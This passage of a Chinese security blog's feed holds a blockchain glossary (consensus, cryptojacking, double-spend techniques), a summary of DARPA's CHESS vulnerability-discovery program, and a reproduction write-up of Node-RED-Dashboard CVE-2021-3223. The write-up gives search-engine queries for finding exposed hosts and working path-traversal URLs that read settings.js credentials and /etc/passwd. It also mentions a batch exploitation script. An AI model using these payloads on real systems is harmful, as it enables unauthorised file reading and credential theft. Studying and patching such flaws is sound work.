一点，矿工必须第一个准确计算出“nonce”，这是一个添加在字符串末尾的数字，用来创建一个满足开头特定个数为零的哈希值。不过存在采矿的大量电力消耗和低交易吞吐量等缺点。</p><h2 id="权益证明PoS"><a href="#权益证明PoS" class="headerlink" title="权益证明PoS"></a>权益证明PoS</h2><p>PoS（proof of Stake）是一种主流的去区块链共识算法，目的是为了让区块链里的分布 式节点达成共识，它往往和工作量证明机制(Proof of Work)一起出现，两种都被认为是区块链共识算法里面的主流算法之一。作为一种算法，它通过<strong>持币人的同意来达成共识，目的是确定出新区块</strong>，这过程相对于 PoW，不需要硬件和电力，且效率更高。</p><p>PoS 共识中引入了 Stake 的概念，持币人将代币进行 Staking，要求所有的参与者抵押一部分他们所拥有的 Token 来验证交易，然后获得出块的机会，PoS 共识中会通过选举算法，按照持币量比例以及 Token 抵押时长，或者是一些其他的方式，选出打包区块的矿工。矿工在指定高度完成打包交易，生成新区块，并广播区块，广播的区块经过 PoS 共识中另外一道”门槛”，验证人验证交易，通过验证后，区块得到确认。这样一轮 PoS 的共识过程就进行完成了。权益证明通过长期绑定验证者的利益和 整个网络的利益来阻止不良行为。锁定代币后，如果验证者存在欺诈性交易，那么他们所抵押的 Token 也会被削减。<strong>PoS 的研究脚步还在不断前进，安全、性能和去中心化一直都是 PoS 所追求的方向，未来也将有更多 PoS 的项目落地。</strong></p><h2 id="委托权益证明DPoS"><a href="#委托权益证明DPoS" class="headerlink" title="委托权益证明DPoS"></a>委托权益证明DPoS</h2><p>DPoS（Delegate Proof of stake）诞生于2013年12月8日，在DPoS 中，让每一个持币者都可以进行投票，由此产生一定数量的代表 ,或者理解为一定数量的节点或矿池，他们彼此之间的权利是完全相等的。持币者可以随时通过投票更换这些代表，以维系链上系统的“长久纯洁性”。<strong>在某种程度上，这很像是国家治理里面的代议制，或者说是人大代表制度。</strong>这种制度最大的好处就是解决了验证人过多导致的效率低下问题，当然，这种制度也有很明显的缺点，由于 “代表”制度，导致其一直饱受中心化诟病。DPoS让代表代替所有持有人来代表进行表决，实际相当于持有人受让出一部分权力由其代为执行，这就出现了中心化问题了，所以才会饱受诟病。</p><h1 id="恶意挖矿攻击Cryptojacking-Attack"><a href="#恶意挖矿攻击Cryptojacking-Attack" class="headerlink" title="恶意挖矿攻击Cryptojacking Attack"></a>恶意挖矿攻击Cryptojacking Attack</h1><p>Cryptojacking是一种恶意行为，是在未授权情况下劫持用户设备挖掘加密货币。通常，攻击者会劫持受害者设备(个人 PC 或服务器)的处理能力和带宽，由于加密货币挖掘需要大量算力，攻击者会尝试同时感染多个设备，这样他们能够收集到足够的算力来执行这种低风险和低成本的挖矿活动。</p><p>这种就是常见的挖矿木马，通过恶意挖矿脚本来占用和利用你的设备的带宽和算力，为其挖矿牟利。这种挖矿木马的溯源分析学习，先前也做过一次实验，挖矿木马感染主机后明显的特征就是CPU占用率极高，甚至持续高达100%。</p><p>对于防范挖矿木马：</p><ul><li>注意设备性能和CPU利用率，如果CPU利用率出现异常就需要引起警惕。</li><li>在Web浏览器上安装挖矿脚本隔离插件，例如MinerBlock、NoCoin和adblocker等。</li><li>小心陌生电子邮件的附件和链接，病从口入啊</li><li>安装一个值得信赖的安全防护软件，并且保持操作系统和应用程序更新，避免因为未打补丁照成的不必要损失。</li></ul><h1 id="无利益攻击Nothing-at-stake-Attack"><a href="#无利益攻击Nothing-at-stake-Attack" class="headerlink" title="无利益攻击Nothing at stake Attack"></a>无利益攻击Nothing at stake Attack</h1><p>Nothing at stake Attack是在PoS共识机制下的待解决问题，问题本质是“作恶无成本，好处无限多”。因为PoS让每个持有人都可以参与到确认出块中来，而当PoS系统出现分叉Fork时，同时在两个fork上出块，无论哪一个fork成为公链，该节点都可以获利，故而某些持有人（节点）恶意地推动分叉，支持或发起不合法交易，以此牟利，但是同时也使得fork大量增加，久而久之区块链网络的一致性将收到破坏，无法达成共识。</p><p>所以PoS为此引入了惩罚机制，对恶意节点进行经济惩罚，以此维护网络稳定。并且发展出了DPoS来解决无利益攻击问题，因为DPoS由持有人选出某些节点来运营网络，这样实际上就可以排除一大部分作恶者，并且可以随时选举替换代表，保证运营节点的纯洁性。</p><h1 id="多签Multi-sig"><a href="#多签Multi-sig" class="headerlink" title="多签Multi-sig"></a>多签Multi-sig</h1><p>多签就是需要多个签名才能执行操作，而这里的多个签名是由多个不同私钥生成的。这样做可以提高安全性，即使丢失一个私钥，攻击者也不能借此控制账户，必须多个可信方同时授权操作才会生效。这就像现实中很多重要系统，都会有两个钥匙来提高安全性，只有持有钥匙的两个人同时使用钥匙才能开启某个系统。这其实也是二者或多方达成共识，才使得操作生效。</p><h1 id="双花攻击-Double-Spend-Attack"><a href="#双花攻击-Double-Spend-Attack" class="headerlink" title="双花攻击 Double Spend Attack"></a>双花攻击 Double Spend Attack</h1><p>Double Spend，一笔钱花两次，十分形象了。利用数字货币的数字特征两次或多次使用“同一笔钱”来交易，双花攻击不产生新Token，把一笔Token转到另外一个地址，然后再通过一些手法来让交易回滚，把花出去的钱再拿回来。常见手法如下：</p><h2 id="1-Race-Attack"><a href="#1-Race-Attack" class="headerlink" title="1. Race Attack"></a>1. Race Attack</h2><p>通过控制矿工费来实现双花，同时发起两个交易，一个是正常交易，另一笔交易发给自己。同时给那笔给自己的交易更多的矿工费，由于给自己那笔交易矿工费用更高，所以被矿工优先打包进区块的概率比较高。这就会让给自己这笔交易早与商家的交易，那么商家的交易就会被回滚。这样就实现了双花。</p><h2 id="2-Finney-Attack"><a href="#2-Finney-Attack" class="headerlink" title="2. Finney Attack"></a>2. Finney Attack</h2><p>利用时间差来实现双花，故意不广播给自己的交易区块，等商家交易发起后，再广播前者区块。攻击对象是接受0确认的商家。假设攻击者挖到区块，该区块中包含着一个交易，即 A 向 B 转了一定数量的Token，其中 A 和 B 都是攻击者的地址。但是攻击者并不广播这个区块，而是立即找到一个愿意接受 0 确认交易的商家向他购买一个物品，向商家发一笔交易，用 A 向商家的地址 C 支付，发给商家的交易广播出去后，攻击者再把自己之前挖到的区块广播出去，由于发给自己的交易先于发给商家的交易，对于攻击者来说，通过控制区的广播时间，就实现了同一笔 Token 的“双花”。</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>零确认交易（Zero Confirmation Transaction ）是指交易卖家不等待该笔交易被区块链网络节点确认，即交付出售的东西。零确认交易是一种信任的标志，卖方必须相信买方在该笔交易被区块链中的其他节点记录前不会再尝试将其持有的加密货币再花在其他地方。说到底利用零确认交易的信任机制，这就是信任问题。</p></blockquote><h2 id="3-Vector76-Attack"><a href="#3-Vector76-Attack" class="headerlink" title="3. Vector76 Attack"></a>3. Vector76 Attack</h2><p>这是一种将Race Attack和Finney Attack结合的攻击手法。攻击者通过建立两个节点，一个用于连接商家节点A，一个用于连接区块链网络中的其他节点的节点B。接着攻击者使用同一笔token发起两笔交易，交易一给商家，交易二给自己，与Race Attack原理一样，给交易二更多的矿工费。然后先保留两笔交易，不急于像race attack一样广播出去。</p><p>然后做类似Finney attack的工作，去交易一所在的分支上挖矿，挖到区块后，也不广播，而是在节点A上发送交易一，在节点B上发送交易二。这个时候，交易二更有可能被认定为有效，而交易一无效。交易二有效后，立即将之前再交易一所在分支挖到的区块广播出去。这个时候，这个接受一次确认就支付的商家，会确认交易成功，然后攻击者可以立即变现转移资产。</p><h2 id="4-51-attack"><a href="#4-51-attack" class="headerlink" title="4. 51% attack"></a>4. 51% attack</h2><p>当攻击者拥有全网50%以上的算力，攻击者就可以创造一条高度大于原来链的新链，使得旧链交易被回滚，使用同一个token发送一笔新交易，实现双花。但是这个要想实现成本还是很高的，50%的算力也没有那么容易获得。</p><h1 id="软分叉-Soft-fork"><a href="#软分叉-Soft-fork" class="headerlink" title="软分叉 Soft-fork"></a>软分叉 Soft-fork</h1><p>软分叉(Soft-fork)更多情况下是一种协议升级，当新共识规则发布后，没有升级的旧节点并不会意识到代码已经发生改变，而继续生产不合法的区块，就会产生临时性分叉，但新节点可以兼容旧节点， 即新旧节点始终在同一条链上工作。</p><h1 id="硬分叉-Hard-fork"><a href="#硬分叉-Hard-fork" class="headerlink" title="硬分叉 Hard-fork"></a>硬分叉 Hard-fork</h1><p>硬分叉是区块链发生永久性分歧。在新共识规则发布后，已经升级的节点无法验证未升级节点产生的区块，未升级节点也无法验证已经升级的节点产生的区块，即新旧节点互不兼容，通常硬分叉就会发生，原有正常的一条链被分成了两条链（已升级的一条链和未升级的一条链，且这两条链互不兼容）。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1]. 雾慢安全团队<a href="https://paper.seebug.org/973/">paper.seebug.org</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Blockchain入门必须从相关名词开始入手。&lt;/p&gt;
&lt;h1 id=&quot;钱包Wallet&quot;&gt;&lt;a href=&quot;#钱包Wallet&quot; class=&quot;headerlink&quot; title=&quot;钱包Wallet&quot;&gt;&lt;/a&gt;钱包Wallet&lt;/h1&gt;&lt;p&gt;Wallet是一个管理私钥的</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="区块链" scheme="http://yoursite.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>初识人机协同漏洞挖掘之概念</title>
    <link href="http://yoursite.com/post/%E5%88%9D%E8%AF%86%E4%BA%BA%E6%9C%BA%E5%8D%8F%E5%90%8C%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E6%A6%82%E5%BF%B5.html"/>
    <id>http://yoursite.com/post/%E5%88%9D%E8%AF%86%E4%BA%BA%E6%9C%BA%E5%8D%8F%E5%90%8C%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E6%A6%82%E5%BF%B5.html</id>
    <published>2021-08-14T03:27:21.000Z</published>
    <updated>2021-08-26T06:16:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近日，有幸可以看到一份关于人机协同探索软件安全的资料，这份资料是在2018年4月19日由DARPA公开发布，各种行业都有人机协同的出现，有的是human-robot,有的是human-mathine，而这种人机协同（human-computer）用于漏洞挖掘的概念很新颖。</p><h1 id="漏洞挖掘方式对比"><a href="#漏洞挖掘方式对比" class="headerlink" title="漏洞挖掘方式对比"></a>漏洞挖掘方式对比</h1><p>在这份资料的开头就直接给出了一个不同漏洞挖掘方法的比较图，也是十分形象和符合现实情况了。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210814222756.png" alt="image-20210814114051402"></p><p>从上图中，我们可以看出<strong>human对于漏洞挖掘速度和准确性都是low</strong>，现实情况是什么呢？其实真是如此，人工进行漏洞挖掘其需要大量的时间付出，漏洞的发现速度自然是low的，而准确性很多时候也是low的，例如在一个复杂系统中，人工发现一个异常点后，往往需要跟进到上下文中去进行判断其是否可以利用，是否存在相应漏洞，但是正由于系统的复杂性人工判断时也会存在误判，从而往往时花费了大量时间，但是最终却产出较低。</p><p>由此人类开始借助computer的力量了，我们开发了各种自动化工具，来辅助我们进行代码审计和漏洞发现，自动化工具利用的计算机的高计算能力，在漏洞发现的速度上是远高于人类的。但是同时又产生了一个问题，<strong>无论什么自动化工具，终究是按照人类为其制定的规则进行运作，在判断漏洞是否存在上依旧会出现大量误判的情况，可以认为其主要解决了了发现速度慢的问题，但准确性的问题依旧存在。</strong></p><p>而人机协同实验表明，在漏洞挖掘速度提升的同时，也能够提高准确性，这是结合了计算机的高运算能力和人类的认知思维的结果。而最后的CHESS，也就是本文提出的Computer and Human Exploring Software Security，则是兼具高速度和高准确度。</p><p>而目前研究的主要方向应该也是集中于<strong>利用人机协同方法来提高漏洞挖掘速度和准确度</strong>，降低漏扫设备的误报率应该也是大家的普遍共识了。速度高的问题利用computer来进行批量检测就可以较好满足，所以如何提高准确度是一个核心问题，人机协同的人要如何参与到这个过程中去，并且与计算机更加合理的进行配合，以可以<strong>将人类的思维认知能力结合入现有的漏洞扫描或挖掘系统中去</strong>。</p><h1 id="CHESS方法"><a href="#CHESS方法" class="headerlink" title="CHESS方法"></a>CHESS方法</h1><p>接下来看看DARPA提出的CHESS方法，这是DARPA的人机协同方案，有一个流程图如下：</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210814222825.png" alt="image-20210814130717741"></p><p>其实从这张图中可以看出human和automation之间协同的部分应该是集中在了Context Processor，也就是我们前面说到的上下文问题，人类挖掘漏洞一般都需要跟进到<strong>上下文</strong>中来考虑，而computer则是以一种静态规则库为主。这一点，中文paper中南京大学的一篇硕士论文就探讨了这个问题，她是对基于java的静态漏洞扫描器的升级改造，可以说是融入了上下文处理这个环节，使得人机协同工作，她的研究表明通过人机协同方式确实能够降低误报率，即提升准确性，并且根据其陈述，这个研究成果已经应用于其所在企业。</p><p>但是CHESS也存在着诸多挑战，作者文章后面就逐一讲述了各个环节中的挑战和可能的解决方法。</p><h2 id="TA1-Human-Collaboration"><a href="#TA1-Human-Collaboration" class="headerlink" title="TA1 Human Collaboration"></a>TA1 Human Collaboration</h2><p>例如在TA1中，就存在：1. 如何去标识和生成一个信息差距代表来传达给人类。2. 如何捕获和处理人类通过推理产生思维。说到底就是人机协同过程中，人如何参与的问题。人机之间如何实现沟通和交互，机器如何表达出人类可以去理解的信息，机器如何去理解人类做出的处理和反应。作者给出的第一个问题的可能答案是使用控制流程图、统一建模语言图或循环活动的希尔伯特曲线。第二个问题的则是使用注释/标签集合、仪表化的程序交互或人类心理模型分析。</p><p>TA1理想状态下，需要实现的过程就是计算机生成人类可以理解的代表性信息，然后由人类来与计算机交互并传达人类的认知和反馈给计算机，计算机也需要将人类反馈的信息转换为漏洞挖掘系统格式，人机之间的交互是较少障碍的情况。当然还有一些愿景需要实现：1.优化人机交互方式。2. 拓展协作能力，不一定是1:1的人机协作。3.降低使用者门槛，利于技术推广，亦可产生更好的效果。4.应该逐渐向着减少人类认知参与比例的方向发展，让人类解放出来，只参与对机器而言较难判断的问题。</p><h2 id="TA2-Vulnerability-Discovery"><a href="#TA2-Vulnerability-Discovery" class="headerlink" title="TA2 Vulnerability Discovery"></a>TA2 Vulnerability Discovery</h2><p>TA2中，作者列出了三大挑战，第一个是确定发现漏洞类别所需要的信息，第二个是引用CRS技术来对新的和现有的表示进行拓展和推理，第三个是开发新的漏洞检测技术来利用人类提供的认知。</p><p>其需要实现的过程就是分析源代码和二进制文件的潜在漏洞，并且识别出源码和二进制文件中不确定的区域和自动分析中的其他障碍，再去识别漏洞的目标种类，最后生成一份漏洞证明和补丁。这个工作很重要，因为它以机器的手段解决了大多数问题，留下无法处理的问题再交由人类来协同工作。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210814222828.png" alt="image-20210814171555372"></p><h2 id="TA3-Voice-of-the-Offense"><a href="#TA3-Voice-of-the-Offense" class="headerlink" title="TA3 Voice of the Offense"></a>TA3 Voice of the Offense</h2><p>TA3中，作者也列出了两个挑战，第一个是开发可拓展到1M+复杂性的挑战性问题。第二个是确保挑战性问题可以代表所需的漏洞类别。这里作者给出的解决方案是前者使用大规模自动化漏洞添加模块，后者使用漏洞测试集合，例如Juliet，CGC，OSS-FUZZ等或者是公共N-day漏洞数据库。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210814222831.png" alt="image-20210814171624614"></p><p>开发具有所有所需类别漏洞和拓展到10k至1M+复杂度的挑战性问题，然后开发一个源码补丁给每一个挑战性问题漏洞，开发一个二进制补丁给每一个挑战性问题漏洞，再为每一类漏洞创建一份漏洞证明规范，开发一个PoV给每一个挑战性问题漏洞。</p><p>这个环节需要确保挑战集合覆盖所有漏洞类别，拓展挑战集合以可以代表大型且复杂的代码库。这是为了保证它能够处理足够多的漏洞类别，从而提高效率。</p><h2 id="TA4-Control-Team"><a href="#TA4-Control-Team" class="headerlink" title="TA4 Control Team"></a>TA4 Control Team</h2><p>在TA4中，作者列出了两个主要任务，第一个就是创建一个专家级黑客性能基线来应对TA3的挑战问题。第二个是确保CHESS R&amp;D团队了解软件逆向工程和利用的前沿技术。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210814222835.png" alt="image-20210814193615123"></p><p>一个优秀的系统，肯定是要使用最先进的工具来发现TA3中开发的源码和二进制挑战问题。根据提供的漏洞证明范本来为每一个发现的漏洞生成报告。并且也要在评估期间去收集反馈，以供后续审查。确认控制团队和CHESS系统之间的不同和冲突的评估效果。</p><h2 id="TA5-Integration，Test-and-Evaluation"><a href="#TA5-Integration，Test-and-Evaluation" class="headerlink" title="TA5 Integration，Test and Evaluation"></a>TA5 Integration，Test and Evaluation</h2><p>在TA5中，有两个主要任务，第一个将TA1和TA2的技术和工艺集成到一个平台中，用于评估和过渡。TA5其实就是TA1+TA2，因为二者是紧密联系的，TA2中对漏洞进行发现，发现后可能出现计算机无法判断的情况，这个是否就要交给TA1中的human来进行处理了，由human来提供一个反馈从而实现人机协同。</p><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1]. Computers and Humans Exploring Software Security, Mr. Dustin Fraze</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;近日，有幸可以看到一份关于人机协同探索软件安全的资料，这份资料是在2018年4月19日由DARPA公开发布，各种行业都有人机协同的出现，有的</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="漏洞挖掘" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>Node-RED任意文件读取漏洞CVE-2021-3223</title>
    <link href="http://yoursite.com/post/Node-RED%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9ECVE-2021-3223.html"/>
    <id>http://yoursite.com/post/Node-RED%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9ECVE-2021-3223.html</id>
    <published>2021-08-08T14:17:23.000Z</published>
    <updated>2021-08-09T02:20:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>Node-RED is a programming tool for wiring together hardware devices, APIs and online services in new and interesting ways.</p><p>It provides a browser-based editor that makes it easy to wire together flows using the wide range of nodes in the palette  that can be deployed to its runtime in a single-clic.</p><p>​                                                                                                                                                           -Node-RED Official Website</p></blockquote><p>Node_RED 本质上是一个NodeJS 应用程序，所以能够在Linux平台的任何设备上安装，比如流行的有树莓Pi，在工业领域，西门子Iot2000，研华 WISE PaaS 网关，美国Groov EPIC 都预先安装了Node-RED.。</p><p>2021年1月11日有用户Github向node-red项目组提交了一个任意文件读取的问题，issues页面：<a href="https://github.com/node-red/node-red-dashboard/issues/669">https://github.com/node-red/node-red-dashboard/issues/669</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次复现的漏洞CVE-2021-3223正是属于Node-RED-dashboard的任意文件读取漏洞，该系统是基于express.js开发，其鉴权方式是依赖配置的，默认没有任何鉴权，当开启鉴权后，会对接口进行鉴权。相关权限在settings.js文件中定义。所以将settings.js作为本次复现中要读取的重要文件之一，我们可以从中来获取重要的配置信息，包括账号密码等。</p><p>其中的username为用户名，password为加密后的密钥，permission为权限，关于权限的信息可以参考<a href="https://nodered.org/docs/user-guide/runtime/securing-node-red#usernamepassword-based-authentication">https://nodered.org/docs/user-guide/runtime/securing-node-red#usernamepassword-based-authentication</a></p><table><thead><tr><th align="center">权限</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">*</td><td align="center">所有权限</td></tr><tr><td align="center">write</td><td align="center">提供写权限，能够进行部署、增、删、改、安装第三方插件等</td></tr><tr><td align="center">read</td><td align="center">提供读权限，可以查看各类流，但是无法部署和修改（增/删/改）</td></tr></tbody></table><h1 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h1><p>Node-RED-Dashboard &lt; 2.26.2 </p><p>利用此漏洞，可以获取用户名密码和读取服务器敏感数据</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>上手看源码吧！去node-red的node-red-dashboard克隆一份源码到本地，commit时间要在2021年1月11日下午8点前的。</p><p>漏洞代码存在于nodes/ui_base.js中，如下图所示：</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210809092141.png" alt="image-20210809090910823"></p><p>从上面的代码中可以看出，这里是设计使用<code>RED.httpAdmin.get(&#39;/ui_base/js/*&#39;</code>的方式来提供接口，用于提供静态资源的拉取。</p><p>这里我们从URL中传入的路径是通过<code>req.params[0]</code>来接收，然后其使用了<code>path.join()</code>的方式来进行路径连接，这样就会产生一个目标文件路径。然后这里没有进行任何的处理，就直接交给<code>res.sendFile()</code>方法来获取内容发回客户端。</p><p>这样就出现了一个问题，如果<code>req.params[0]</code>中接收的参数包含<code>../</code>，就可能由此进行目录穿越，从而导致CVE-2021-3223的任意文件读取漏洞。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="利用空间搜索引擎查找目标"><a href="#利用空间搜索引擎查找目标" class="headerlink" title="利用空间搜索引擎查找目标"></a>利用空间搜索引擎查找目标</h2><pre class="line-numbers language-none"><code class="language-none">fofa: title&#x3D;&quot;Node-RED&quot;zoomeye: title:&quot;Node-RED&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>全球分布情况：</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210809001731.png" alt="image-20210809000859182"></p><p>全球TOP10：</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210809001729.png" alt="image-20210809000946756"></p><p>我国保有量位列第4，所以影响还是很大的。设备数达到了6000以上。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre class="line-numbers language-none"><code class="language-none">ip&#x2F;ui_base&#x2F;js&#x2F;..%2f..%2f..%2f..%2fsettings.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试获取用户名和密码：</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210809001724.png" alt="image-20210809001325201"></p><p>当然也可以去尝试获取系统文件</p><p>exp：</p><pre class="line-numbers language-none"><code class="language-none">ip&#x2F;ui_base&#x2F;js&#x2F;..%2f..%2f..%2f..%2f..%2f&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/20210809001719.png" alt="image-20210809001556660"></p><h1 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h1><p>1、更新Node-RED-Dashboard到2.26.2版本以上，可以有效防止这个漏洞。</p><h1 id="批量验证脚本"><a href="#批量验证脚本" class="headerlink" title="批量验证脚本"></a>批量验证脚本</h1><p>另外针对此漏洞的批量化利用脚本也已经在今天写好了，后续将会同步到之前的Github仓库中，仓库地址为<a href="https://github.com/A1andNS/auto_vuln_test_script">A1andNS/auto_vuln_test_script: There are some Vuln POC auto test scripts based on python3 by A1andNS (github.com)</a></p><h1 id="参考相关链接"><a href="#参考相关链接" class="headerlink" title="参考相关链接"></a>参考相关链接</h1><p>[1] <a href="https://nodered.org/docs/user-guide/runtime/securing-node-red#usernamepassword-based-authentication">https://nodered.org/docs/user-guide/runtime/securing-node-red#usernamepassword-based-authentication</a></p><p>[2] <a href="https://cve.circl.lu/cve/CVE-2021-3223">https://cve.circl.lu/cve/CVE-2021-3223</a></p><p>[3] <a href="https://mp.weixin.qq.com/s/ZpmhBzgqL6QqHXkDBHOH5w">https://mp.weixin.qq.com/s/ZpmhBzgqL6QqHXkDBHOH5w</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知识&quot;&gt;&lt;/a&gt;背景知识&lt;/h1&gt;&lt;blockquote&gt;&lt;span class=&quot;custom-blockquote-svg&quot;&gt;&lt;svg width=&quot;24&quot; h</summary>
      
    
    
    
    <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="任意文件" scheme="http://yoursite.com/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>自动化漏洞测试的小尝试</title>
    <link href="http://yoursite.com/post/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E7%9A%84%E5%B0%8F%E5%B0%9D%E8%AF%95.html"/>
    <id>http://yoursite.com/post/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%E7%9A%84%E5%B0%8F%E5%B0%9D%E8%AF%95.html</id>
    <published>2021-07-26T06:59:03.000Z</published>
    <updated>2021-07-26T09:25:14.000Z</updated>
    
